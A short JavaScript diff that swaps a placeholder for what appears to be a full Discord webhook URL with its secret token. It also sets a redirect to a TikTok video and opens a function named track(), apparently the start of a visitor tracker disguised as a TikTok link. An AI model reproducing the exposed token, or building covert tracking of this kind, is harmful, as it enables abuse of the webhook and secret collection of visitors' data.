@@ -1,4 +1,4 @@
-const WEBHOOK_URL = "ここにあなたのWebhookURL"; 
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU"; 
 const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?...";
 
 async function track() {
